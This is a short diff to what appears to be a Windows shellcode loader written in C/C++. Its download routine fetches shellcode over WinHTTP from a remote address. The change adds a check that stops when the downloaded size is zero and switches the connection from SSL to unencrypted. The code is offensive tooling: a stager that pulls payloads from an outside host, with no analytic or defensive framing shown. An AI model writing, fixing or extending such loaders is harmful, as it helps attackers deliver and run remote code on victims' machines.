@@ -157,6 +157,10 @@ int main()
     printf("Finished download, shellcode size is %d\n", shellcode_size);
 #endif
 
+	if (shellcode_size == 0) {
+		fprintf(stderr, "Shellcode size is 0, download error\n");
+		return 0;
+	}
     if (shellcode_size > MAXSHELLCODESIZE) {
         fprintf(stderr, "Shellcode too big (%d bytes), max size is %d bytes\n", shellcode_size, MAXSHELLCODESIZE);
         return 0;
@@ -299,8 +303,8 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
- //       0); // no ssl
-        WINHTTP_FLAG_SECURE);          // enable ssl
+        0); // no ssl
+ //       WINHTTP_FLAG_SECURE);          // enable ssl
 
         // create session for target
     HINTERNET hConnect = WinHttpConnect(
